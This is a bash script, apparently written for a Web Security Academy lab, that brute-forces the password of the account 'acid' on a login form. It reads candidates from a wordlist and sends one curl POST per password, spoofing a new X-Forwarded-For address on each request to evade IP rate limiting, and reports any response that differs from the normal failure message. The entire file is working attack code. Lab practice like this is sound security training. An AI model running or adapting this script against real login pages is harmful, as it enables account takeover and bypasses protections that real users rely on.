#!/usr/bin/env bash

HOST="0ad300f5030dd2ae81c0d5e200a40063.web-security-academy.net"
NORMAL="Invalid username or password."
i=1

while IFS= read -r p; do
  msg=$(
    curl -s -X POST "https://$HOST/login" \
      -H "X-Forwarded-For: 127.8.1.$i" \
      --data-urlencode "username=acid" \
      --data-urlencode "password=$p" \
      | grep -oP '<p class=is-warning>\K.*(?=</p>)'
  )

  if [[ "$msg" != "$NORMAL" ]]; then
    echo "[+] Found Password = $p | [+] Relevant Message =  $msg"
  fi

  i=$((i+1))
done < pass_list.txt
